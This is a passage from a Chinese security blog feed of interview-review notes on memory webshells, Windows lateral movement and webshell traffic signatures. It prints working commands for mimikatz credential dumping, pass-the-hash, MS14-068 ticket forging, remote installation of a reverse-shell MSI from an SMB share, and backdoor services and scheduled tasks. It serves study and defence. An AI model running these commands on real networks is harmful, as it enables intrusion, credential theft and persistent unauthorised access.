通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如tomcat的valve内存马</p><ul><li>filter型</li><li>servlet型</li><li>listener型</li></ul><h4 id="字节码增强型"><a href="#字节码增强型" class="headerlink" title="字节码增强型"></a>字节码增强型</h4><p>  通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="spring类"><a href="#spring类" class="headerlink" title="spring类"></a>spring类</h5><ul><li>拦截器</li><li>Controller型</li></ul><h5 id="Tomcat-filter型内存马"><a href="#Tomcat-filter型内存马" class="headerlink" title="Tomcat filter型内存马"></a>Tomcat filter型内存马</h5><p>  所谓filter内存马，就是在web容器中创建了含有恶意代码的filter，在请求传递到servlet前被拦截下来且执行了恶意代码。</p><h5 id="Tomcat-servlet型内存马"><a href="#Tomcat-servlet型内存马" class="headerlink" title="Tomcat servlet型内存马"></a>Tomcat servlet型内存马</h5><p>  servlet型的内存马原理就是注册一个恶意的servlet，与filter相似，只是创建过程不同。<br>  核心还是看StandardContext，在init filter后就调用了loadOnStartup方法实例化servlet<br>  可以发现servlet的相关信息是保存在StandardContext的children字段。</p><h5 id="Tomcat-listener型内存马"><a href="#Tomcat-listener型内存马" class="headerlink" title="Tomcat listener型内存马"></a>Tomcat listener型内存马</h5><p>  listener用于监听时间的发生或状态的改变，其初始化与调用顺序在filter之前。<br>  listener选择很多。我们选择与request相关的ServletRequestListener。<br>  Tomcat使用两类Listener接口分别是org.apache.catalina.LifecycleListener和原生Java.util.EventListener。<br>  一般作为webshell，需要对网站发送请求使用Java.util.EventListener。</p><h4 id="查杀思路"><a href="#查杀思路" class="headerlink" title="查杀思路"></a>查杀思路</h4><ul><li>利用Java Agent遍历加载到内存中的Class</li><li>先判断是否是内存马，是则进入内存查杀。</li></ul><h4 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h4><ul><li>根据shell或者随机数关键字</li><li>根据 Filter 优先级；为了使权限最大化，保证在各种情况下都可以访问，需要把优先级调到最高</li><li>根据特殊的classloader（类加载器）、 Filter 对应的ClassLoader目录进行检测； Filter 也是一种Class，必定需要特定的classloader（类加载器）</li><li>把内存中class导出，反编译之后查看是否存在恶意代码；如调用的了一些特殊的方法<ul><li>java.lang.Runtime.getRuntime</li><li>defineClass</li><li>invoke</li></ul></li></ul><h2 id="内网横向方法"><a href="#内网横向方法" class="headerlink" title="内网横向方法"></a>内网横向方法</h2><p>  <strong>攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。</strong><br>  <a href="https://smms.app/image/WSPdBCXrzvtZj3G" target="_blank"><img src="https://s2.loli.net/2024/03/23/WSPdBCXrzvtZj3G.png" ></a></p><h4 id="IPC横向"><a href="#IPC横向" class="headerlink" title="IPC横向"></a>IPC横向</h4><p>  执行<code>net share</code>命令，可以获得Windows默认开启的网络共享，其中C$为C盘共享，ADMIN$为系统目录共享，还有一个IPC$共享。<br>  IPC是共享”命令管道”的资源，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。<br>  通过IPC$连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或服务等。<br>  <strong>建立IPC$连接需要具备以下两个条件：</strong><br>    ①远程主机开启了IPC连接<br>    ②远程主机的139端口和445端口开放</p><pre><code># IPC$ 连接net use \\ip\ipc$                     # 建立空连接net use \\ip\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;   # 建立非空连接# IPC$ 使用net use                               # 查看本机建立的连接(本机连接其他机器)net session                           # 查看本机建立的连接(其他机器连接的本机)，需要administrator用户执行net share                             # 查看本地开启的共享net share ipc$                        # 开启ipc$共享net share ipc$ /del                   # 删除ipc$共享net share admin$ /del                 # 删除admin$共享net share c$ /del                     # 删除C盘共享net use * /del                        # 删除所有连接# IPC$ 连接建立之后的操作dir \\ip\c$                              # 列出目标文件目录copy C:\\Users\Administrator\Desktop\whatever.exe \\ip\c$\aaa # 将文件复制到目标C盘aaa目录下type \\ip\c$\1.txt                       # 查看目标C盘下1.txt文件内容net use h: \\ip\c$                       # 磁盘映射，将目标的 C 盘映射到本地的 H 盘net use h: /del                          # 删除磁盘映射</code></pre><h4 id="远程桌面协议横向"><a href="#远程桌面协议横向" class="headerlink" title="远程桌面协议横向"></a>远程桌面协议横向</h4><h5 id="利用远程桌面协议（RDP）"><a href="#利用远程桌面协议（RDP）" class="headerlink" title="利用远程桌面协议（RDP）"></a>利用远程桌面协议（RDP）</h5><p>  ① 查询注册表确定是否主机开启了远程桌面</p><pre><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections ps: 若字段值为0，则表示已启动RDP；若为1，则表示禁用RDP</code></pre><p>  ② 开启远程桌面</p><pre><code>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f </code></pre><p>  ③ 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权） </p><pre><code>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0  </code></pre><p>  ④ 设置防火墙策略放行3389端口 </p><pre><code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></pre><h5 id="RDP-Hijack"><a href="#RDP-Hijack" class="headerlink" title="RDP Hijack"></a>RDP Hijack</h5><p>  Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。<br>  可以通过<code>query user</code>来列出所有登录的用户列表，得到id<br>  在SYSTEM权限下，使用<code>tscon &lt;ID&gt;</code>来切换用户不需要验证密码。</p><h5 id="sharp-RDP"><a href="#sharp-RDP" class="headerlink" title="sharp RDP"></a><a href="https://github.com/0xthirteen/SharpRDP">sharp RDP</a></h5><p>  sharp rdp可以通过远程桌面协议在远程主机上执行系统命令，且不需要GUI客户端。<br>  工具需要远程主机开启远程桌面功能，且防火墙放行3389端口</p><h5 id="WMI横向"><a href="#WMI横向" class="headerlink" title="WMI横向"></a>WMI横向</h5><p>  WMI（Windows管理规范）是一项核心的Windows管理技术。用户可以通过WMI管理本地和远程主机。<br>  Windows为传输WMI数据提供了两个可用的协议：分布式组件对象模型（DCOM）和Windows远程管理（WinRM）使得WMI对象的查询、事件注册、WMI类方法的执行和类的创建等操作都能远程运行。<br>  <strong>目前两种常见的利用方法：</strong></p><ol><li>通过调用WMI的类方法进行远程调用，如Win32_Process类中的Create方法可以在远程主机上创建进程，Win32_Product类的Install方法可以在远程主机上安装恶意的MSI</li><li>远程部署WMI事件订阅，在特定事件发生时触发<br>  <strong>利用WMI进行横向移动需要具备以下条件：</strong></li><li>远程主机的WMI服务为开启状态（默认开启）</li><li>远程主机防火墙放行135端口，这是WMI管理的默认端口<br>  <strong>利用步骤：</strong></li><li>通过WMI查询远程主机上运行的进程信息<pre><code>wmic /node:192.168.1.131 /user:Administrator /password:123456@ process list brief # /node 执行远程主机的地址</code></pre></li><li>创建远程进程<br>通过调用Win32_Process.Create方法在远程主机上创建进程，启动CMD来执行命令<br>由于WMIC在执行命令时没有回显，因此可以将执行结果写入文件，然后通过别的方式读取文件<pre><code>wmic /node:192.168.1.131 /user:Administrator /password:123456@ process call create &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;</code></pre></li><li>远程安装MSI文件<br>通过调用Win32_Product.Install方法，可以控制远程主机安装恶意MSI文件，从而获得权限<pre><code>wmic /node:192.168.1.131 /user:Administrator /password:123456@ product call install PackageLocation=&quot;\\192.168.1.1\mysmb\reverse_tcp.msi&quot;</code></pre></li></ol><h4 id="SMB横向"><a href="#SMB横向" class="headerlink" title="SMB横向"></a>SMB横向</h4><p>  SMB（服务器消息块），又称CIFS（网络文件共享系统），主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通信等资源。<br>  客户端与服务器建立连接后,客户端可以向服务器发送SMB命令允许用户访问共享、打开、读取或者是写入文件。<br>  SMB消息一般使用NetBIOS协议或TCP发送，分别使用端口139或445，目前倾向于使用445端口。<br>  <strong>利用条件；</strong></p><ol><li>445端口开放</li><li>知道账号密码<br>  <strong>利用步骤：</strong></li><li>建立IPC链接，psexec 需要明文或 hash 传递<pre><code>net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administratorpsexec \\192.168.3.32 -s cmd       //需要先有 ipc 链接 -s 以 System 权限运行</code></pre></li><li>或者不用建立 IPC 直接提供明文账户密码<pre><code>psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</code></pre></li></ol><h4 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h4><p>密码喷洒使用常见密码列表来访问一个域上的多个帐户。<br>撞库则是使用一组凭据来尝试访问多个域中的不同帐户。<br><strong>利用metasploit进行密码喷洒实质上还是弱口令攻击</strong><br>以上是知道账密的情况下横向</p><h4 id="PTH-哈希传递-pass-the-hash"><a href="#PTH-哈希传递-pass-the-hash" class="headerlink" title="PTH-哈希传递(pass the hash)"></a>PTH-哈希传递(pass the hash)</h4><p>  <strong>利用 LM 或 NTLM 的值进行的渗透测试</strong></p><h5 id="在工作组环境中："><a href="#在工作组环境中：" class="headerlink" title="在工作组环境中："></a>在工作组环境中：</h5><p>  Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。<br>  Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问</p><h5 id="在域环境中："><a href="#在域环境中：" class="headerlink" title="在域环境中："></a>在域环境中：</h5><p>  只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器<br>  如果要用普通域管理员账号进行哈希传递攻击，则需要修改修改目标机器的 LocalAccountTokenFilterPolicy为1</p><h5 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h5><p>  原理是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。<br>  如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。<br>  安装补丁后可以使用 AES keys 代替 NT hash 来实现 ptk 攻击</p><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><ol><li>用mimikatz抓取NTLM Hash：<pre><code>privilege::debugsekurlsa::msvsekurlsa::ekeyssekurlsa::logonpasswords</code></pre></li><li>用mimikatz将获取的Administrator的Hash添加进lsass中<pre><code>privilege::debugsekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值 hash</code></pre></li><li>弹出shell访问远程主机或服务<pre><code>net use \\192.168.52.138       #建立IPC连接dir \\192.168.52.138\c$        #查看连接域内ip的c盘文件夹</code></pre></li></ol><h4 id="PTK-aes256传递-pass-the-key"><a href="#PTK-aes256传递-pass-the-key" class="headerlink" title="PTK-aes256传递(pass the key)"></a>PTK-aes256传递(pass the key)</h4><p>  <strong>利用的 ekeys aes256 进行的渗透测试</strong><br>  系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash也就失去了作用，但是可以通过pass the key的攻击方式获得权限。<br>  该攻击方法需要获取用户的aes key<br>  打补丁前不能连接，打补丁后才能任意用户都可以采用 aes256 连接</p><h5 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>  与PTH相同</p><h5 id="利用Mimikatz进行PTH"><a href="#利用Mimikatz进行PTH" class="headerlink" title="利用Mimikatz进行PTH"></a>利用Mimikatz进行PTH</h5><p>  mimikatz进行哈希传递需要本地管理员权限。</p><h4 id="PTT-票据传递（ms14-068-pass-the-ticket）"><a href="#PTT-票据传递（ms14-068-pass-the-ticket）" class="headerlink" title="PTT-票据传递（ms14-068-pass the ticket）"></a>PTT-票据传递（ms14-068-pass the ticket）</h4><p>  <strong>利用的票据凭证 TGT 进行的渗透测试</strong><br>  不需要管理员权限就可以获得远程系统的访问权限，Pass The Ticket 票据传递（PTT攻击）实现<strong>【未授权访问】</strong>。<br>  PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的，三种常见的攻击方法：<br>  <code>MS14-068</code>，<code>Golden ticket</code>，<code>SILVER ticket</code>。<br>  因为当前主机之前肯定与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据、利用。该方法类似于cookie欺骗。<br>  票据是有有效期的，一般为10小时，所以如果当前主机10h之内连接过域控的话，我们可以利用该票据，但是如果超过10h，就没法利用了。<br>  简单来说就是将连接合法的票据注入到内存中实现连接。<br>  Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术。<br>  MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。<br>  <a href="https://smms.app/image/Ozy9pLr7JWviUah" target="_blank"><img src="https://s2.loli.net/2024/03/23/Ozy9pLr7JWviUah.png" ></a></p><h5 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>  ① 抓取用户的哈希</p><pre><code>sekurlsa::logonpasswords fullsekurlsa::tickets /export</code></pre><p>  ② 删除票据，排除干扰</p><pre><code>klist purge</code></pre><p>  ③ 利用抓取的域管理员的NTLM hash进行哈希传递</p><pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:abcde.com /ntlm:哈希值&quot; exitkerberos::ptt 票据文件</code></pre><h4 id="MS14-068攻击"><a href="#MS14-068攻击" class="headerlink" title="MS14-068攻击"></a><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">MS14-068</a>攻击</h4><p>  MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。<br>  Windows域中使用kerberos协议过程中，为了让服务器判断Client是否有权限访问服务，微软在Windows平台上在Kerberos协议中增加了PAC（Privilege Attribute Certificate）特权属性证书，也就是这个PAC造成了MS14-068这个漏洞。<br>  PAC是用来验证Client的访问权限的，它会被放在TGT里发送给Client，然后由Client发送给TGS。<br>  漏洞允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意的PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。普通用户可以通过呈现具有改变了PAC的Kerberos TGT来获得票证，进而伪造票据获得管理员权限。</p><h5 id="漏洞利用条件："><a href="#漏洞利用条件：" class="headerlink" title="漏洞利用条件："></a>漏洞利用条件：</h5><p>  1. 域内任意用户SID<br>  2. 域内任意用户密码</p><h5 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h5><p>  1. 获得一个域用户douser的SID</p><pre><code>whoami /all</code></pre><p>  2. 上传工具ms14-068.exe，并执行命令生成TGT票据</p><pre><code>ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器ip地址 -p 域成员密码</code></pre><p>  3. 上传mimikatz，利用mimikatz将票据注入到当前内存中伪造凭证</p><pre><code>mimikatz # kerberos::purge          //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造mimikatz # kerberos::list           //查看当前机器凭证mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</code></pre><p>  4. 使用net use进行登录或者使用psexec，wmi等方法进行远程执行命令</p><pre><code>net use \\WIN-ENS2VR5TR3N           //登录域控</code></pre><p>  5. 上传一个正向的msf马，并将该木马copy到域控上去执行</p><pre><code>copy c:\windows\system32\shell.exe \\WIN-ENS2VR5TR3N\c$</code></pre><p>  6. 通过sc远程对域控创建服务来启动木马</p><pre><code>sc \\WIN-ENS2VR5TR3N create bindshell binpath= &quot;c:\shell.exe&quot;sc \\WIN-ENS2VR5TR3N start bindshell</code></pre><h4 id="kerberoast攻击"><a href="#kerberoast攻击" class="headerlink" title="kerberoast攻击"></a>kerberoast攻击</h4><p>  攻击者从 TGS-REP 中提取加密的服务票证。<br>  由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。</p><h4 id="WinRM横向"><a href="#WinRM横向" class="headerlink" title="WinRM横向"></a>WinRM横向</h4><p>  <strong>Windows远程管理提供了两个工具：</strong><br>① Winrs，允许远程执行命令的命令行工具，利用了WS-Manage协议<br>② Winrm（Winrm.cmd)，内置系统管理命令行工具，允许管理员配置本机的WinRM服务。<br>  WinRM是通过执行WS-Management协议（用于远程软件和硬件管理的Web服务协议）来实现远程管理的，允许处于一个共同网络内的Windows计算机彼此之间互相访问和交换信息，对应的端口是5985。<br>  在一台计算机启用WinRM服务后，防火墙会自动放行其相关通信端口，在另一台计算机便能通过WinRM对其进行远程管理了。<br>  在利用WinRM进行横向移动时，需要拥有远程主机的管理员凭据信息。<br>  在默认情况下，无法通过WinRM连接到目标系统。可能出现错误：Winrs error：WinRM客户端无法处理该请求。<br><strong>可以将默认身份验证与IP地址结合使用：</strong><br>  ① 传输为HTTPS或目标位于TrustedHosts列表中，并且提供显式凭据<br>  ② 使用Winrm.cmd配置TrustedHosts<br>  ③ 将目标地址添加到TrustedHosts中</p><pre><code>winrm set winrm/config/client @&#123;TrustedHosts=&quot;192.168.1.1&quot;&#125; set-Item WSMan:localhost\client\trustedhosts -value *    # 通过powershell，信任所有主机</code></pre><p>  ④ 使用Winrs或者WinRM执行命令</p><pre><code>【Winrs】# 执行系统命令 winrs -r:http://192.168.1.131:5985 -u:Administrator -p:123456@ &quot;whoami&quot; # 获取远程交互式命令行 winrs -r:http://192.168.1.131:5985 -u:Administrator -p:123456@ &quot;cmd&quot;【WinRM】winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=&quot;notepad.exe&quot;&#125; -r:http://192.168.1.131:5985 -u:Administrator -p:123456@</code></pre><h4 id="AT-amp-schtasks-计划任务横向"><a href="#AT-amp-schtasks-计划任务横向" class="headerlink" title="AT &amp; schtasks 计划任务横向"></a>AT &amp; schtasks 计划任务横向</h4><p>  <strong>利用思路：</strong><br>获取到某域主机权限<br>-&gt;minikatz 得到密码（明文，hash）<br>-&gt;用到信息收集里面域用户的列表当做用户名字典<br>-&gt;用到密码明文当做密码字典<br>-&gt;尝试连接<br>-&gt;创建计划任务(at|schtasks)<br>-&gt;执行文件可为后门或者相关命令</p><p>  <strong>AT利用流程：</strong><br>① 建立 IPC 链接到目标主机<br>② 拷贝要执行的命令脚本到目标主机</p><pre><code>copy hack.bat \\192.168.1.131\c$\Windows\Temp</code></pre><p>③ 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p><pre><code>net time \\192.168.1.131at \\192.168.1.131 19:48 c:\Windows\Temp\hack.bat</code></pre><p>④ 删除 IPC 链接</p><pre><code>at \\192.168.1.131 任务ID /delete</code></pre><p>  ps: Windows Server 2012 以后的版本没有at命令，只有schtasks命令</p><p>  <strong>schtasks利用流程：</strong><br>① 利用已建立的IPC连接上传后门程序<br>② 利用已建立的IPC连接或指定用户凭据的方式在远程主机上创建计划任务shell</p><pre><code>schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO 1 /TR C:\users\pubilc\shell.exe /RN System /F </code></pre><p>③ 等待计划任务自行执行，或者立即启动计划任务shell</p><pre><code>schtasks /RUN /S 192.168.1.131 /I /TN Backdoor</code></pre><p>④ 查看计划任务shell</p><pre><code>schtasks /query /S 192.168.1.131 /TN Backdoo</code></pre><p>⑤ 删除计划任务shell</p><pre><code>schtasks /Delete /S 192.168.1.131 /TN Backdoor /F</code></pre><p>  ps:在使用schtasks命令时，会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt</p><h4 id="SC创建Windows服务进行横向渗透"><a href="#SC创建Windows服务进行横向渗透" class="headerlink" title="SC创建Windows服务进行横向渗透"></a>SC创建Windows服务进行横向渗透</h4><p>  ① 创建远程服务需要拥有两端主机的管理员权限（要创建服务）和IPC连接<br>  ② 利用已建立的共享连接向远程主机上传攻击载荷reverse_tcp.exe<br>  ③ 利用已建立的IPC连接在远程主机上创建系统服务shell</p><pre><code>sc \\192.168.1.131 create Backdoor binpath= &quot;cmd.exe /k c:\users\public\reverse_tcp.exe&quot;</code></pre><p>  ④ 删除服务shell</p><pre><code>sc \\192.168.1.131 delete Backdoor</code></pre><p>  ps:binpath的等号后面需要有一个空格</p><h4 id="PsExec工具横向"><a href="#PsExec工具横向" class="headerlink" title="PsExec工具横向"></a>PsExec工具横向</h4><p>  psexec 是 windows 开发的远程命令行工具。<br>  psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。<br>  目标主机开启了防火墙，psexec会提示找不到网络路径。但由于PsExec是Windows提供的工具，所以杀毒软件将其列在白名单中。<br>  如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务）<br>  如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。<br>  <strong>基本原理：</strong><br>  通过ipc$连接，释放二进制文件psexecsvc.exe到目标<br>  通过服务管理SCManager远程创建一个psexec服务，并启动服务</p><pre><code>psexec.exe -accepteula \\192.168.1.131 -u Administrator -p password@ -s cmd.exe </code></pre><p>  客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据</p><pre><code>psexec.exe -accepteula \\192.168.1.131 -s cmd.exe</code></pre><p>  运行结束后删除服务</p><h4 id="DCOM远程命令攻击"><a href="#DCOM远程命令攻击" class="headerlink" title="DCOM远程命令攻击"></a>DCOM远程命令攻击</h4><p>  COM（组件对象模型）是微软的一套软件组成的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。<br>  COM指定了一个对象模型和编程要求，使COM对象能够与其他对象交互。这些对象可以在单个进程中，也可以在其它进程中，甚至可以在远程计算机中。<br>  DCOM（分布式组件对象模型）是基于COM的一系列概念和程序接口，支持不同机器上的组件间通信。<br>  利用DCOM，客户端程序对象可以请求来自网络中另一台计算机上的服务器程序对象。<br>  <strong>使用DCOM在远程主机上面执行命令，需要具有以下条件：</strong></p><ol><li>具有管理员权限的PowerShell</li><li>可能需要关闭目标系统的防火墙。</li><li>在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户<br>  <strong>目前常利用的DCOM组件有：</strong><br><code>MMC20.Application</code>、<code>ShellWindows</code>、<code>Excel.Application</code>、<code>ShellBrowserWindow</code></li></ol><h4 id="NTLM-Relay攻击"><a href="#NTLM-Relay攻击" class="headerlink" title="NTLM Relay攻击"></a>NTLM Relay攻击</h4><p>  在Windows中，NTLM hash 分为 <code>NTLMv1</code> 、<code>NTLMv2</code> 、<code>NTLM session v2</code> 三种。<br>  <code>NTLMv2</code> 的强度比 <code>NTLMv1</code> 强了不少 ，我们在实战中，如果获得的是NTLMv1的话直接对其进行爆破就行了，而现实情况中我们遇到的是 <code>NTLMv2</code>，<code>NTLMv2</code>的密码强度高了不少，因此需要使用NTLM Relay攻击。<br>  NTLM Relay攻击就是要将截获的Net-NTLM Hash重放来进行攻击，从而实现对其他机器的控制，所以严格意义上应该叫作Net-NTLM Relay。<br>  Net-NTLM Hash 是基于用户密码的NTLM Hash计算出来的，用于在网络环境下 NTLM 认证的 hash。为了重放这个Net-NTLMhash，首先我们要做的就是获取这个Net-NTLMhash。<br>  获得Net-NTLM Relay的思路可以有以下几种：</p><h5 id="利用LLMNR和NetBIOS欺骗获得Net-NTLMHash"><a href="#利用LLMNR和NetBIOS欺骗获得Net-NTLMHash" class="headerlink" title="利用LLMNR和NetBIOS欺骗获得Net-NTLMHash"></a>利用LLMNR和NetBIOS欺骗获得Net-NTLMHash</h5><p>  <strong>Windows系统名称解析顺序为：</strong></p><ul><li>本地hosts文件（%windir%\System32\drivers\etc\hosts）</li><li>DNS缓存/DNS服务器</li><li>链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）<br> 也就是说，如果在缓存中没有找到名称，DNS名称服务器又请求失败时，Windows系统就会通过链路本地多播名称解析（LLMNR）和Net-BIOS名称服务（NBT-NS）在本地进行名称解析。<br>  这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是目标机器。<br>  当用户输入不存在、包含错误或者DNS中没有的主机名时，通过工具(responder)监听LLMNR和NetBIOS广播，攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。<br>  核心过程与arp欺骗类似，我们可以让攻击者作中间人，截获到客户端的Net-NTLMHash。<h5 id="利用WPAD劫持获得Net-NTLMHash"><a href="#利用WPAD劫持获得Net-NTLMHash" class="headerlink" title="利用WPAD劫持获得Net-NTLMHash"></a>利用WPAD劫持获得Net-NTLMHash</h5>  WPAD 网络代理自动发现协议是一种客户端使用DCHP、DNS、LLMNR、NBNS协议来定位一个代理配置文件(PAC)URL的方法。<br>  WPAD通过让浏览器自动发现代理服务器，查找存放PAC 文件的主机来定位代理配置文件，下载编译并运行，最终自动使用代理访问网络。<br>  一个典型的劫持方式是利用LLMNR/NBNS欺骗来让受害者从攻击者获取PAC文件，PAC文件指定攻击者就是代理服务器，然后攻击者就可以劫持受害者的HTTP流量，在其中插入任意HTML标签从而获得用户的Net-NTLMHash。<h5 id="具体实现方法请看此链接"><a href="#具体实现方法请看此链接" class="headerlink" title="具体实现方法请看此链接"></a>具体实现方法请看此<a href="https://www.freebuf.com/articles/244375.html">链接</a></h5></li></ul><h4 id="mimikatz常用命令"><a href="#mimikatz常用命令" class="headerlink" title="mimikatz常用命令"></a><a href="https://github.com/ParrotSec/mimikatz">mimikatz</a>常用命令</h4><pre><code>privilege::debug            #提升权限sekurlsa::logonpasswords    #抓取密码信息sekurlsa::msv               #抓取LM、NTLM、值sekurlsa::ekeys             #抓取aes值</code></pre><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>  <strong>只有IPC、WMI、SMB、密码喷洒是知道账密的情况下横向，不知道密码请使用其它方法。</strong><br>  <strong>psexec工具合法，监测到会告警，但是释放文件会被杀。</strong><br>  <strong>smbexec为impacket工具中的工具，操作简单，容易被杀，使用时无需先进行IPC连接</strong></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  <strong>内网渗透的内容难度确实很高，到这里感觉工具的使用不再重要，更重要的是思路。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Shiro550和721的原理区别&quot;&gt;&lt;a href=&quot;#Shiro550和721的原理区别&quot; class=&quot;headerlink&quot; title=&quot;Shiro550和721的原理区别&quot;&gt;&lt;/a&gt;Shiro550和721的原理区别&lt;/h2&gt;&lt;h4 id=&quot;Shiro</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>面试复习二</title>
    <link href="https://liu1272.github.io/2024/03/21/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%BA%8C/"/>
    <id>https://liu1272.github.io/2024/03/21/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%BA%8C/</id>
    <published>2024-03-21T08:24:00.000Z</published>
    <updated>2024-03-23T09:39:46.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Shell工具的流量特征"><a href="#Shell工具的流量特征" class="headerlink" title="Shell工具的流量特征"></a>Shell工具的流量特征</h2><h4 id="冰蝎2-0"><a href="#冰蝎2-0" class="headerlink" title="冰蝎2.0"></a>冰蝎2.0</h4><p>  使用<code>AES加密 + base64编码</code>，AES使用动态密钥对通信进行加密，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。<br>  因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。<br>  Content-Length: 16, 16就是冰蝎2连接的特征<br><a href="https://smms.app/image/6DIM4aQdVYeEKou" target="_blank"><img src="https://s2.loli.net/2024/03/21/6DIM4aQdVYeEKou.png" ></a><br><a href="https://smms.app/image/MCBFLsHGmeXWKc8" target="_blank"><img src="https://s2.loli.net/2024/03/21/MCBFLsHGmeXWKc8.png" ></a></p><h4 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h4><p>  取消了2.0的动态获取密钥，使用固定的连接密钥<br>  在冰蝎中，任何请求，最终都会调用Utils.getData函数，对请求的参数加密。对于上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，payload都为定长，且无随机padding。<br>  webshell连接密码的MD5的前16位，默认连接密码是”<strong>rebeyond</strong>“(即密钥是<code>md5(&#39;rebeyond&#39;)[0:16]=e45e329feb5d925b</code>)<br>  3.0连接jsp的webshell的请求数据包中的content-type字段常见为application/octet-stream</p><h4 id="冰蝎4-0"><a href="#冰蝎4-0" class="headerlink" title="冰蝎4.0"></a>冰蝎4.0</h4><p>  v4.0版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。<br>  Accept字段（弱特征），通常是Accept: application/json, text/javascript, /; q=0.01 意思是浏览器可接受任何文件，但最倾向application/json 和 text/javascript。<br>  Content-Type字段（弱特征），通常是Content-type: Application/x-www-form-urlencoded<br>  连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。<br>  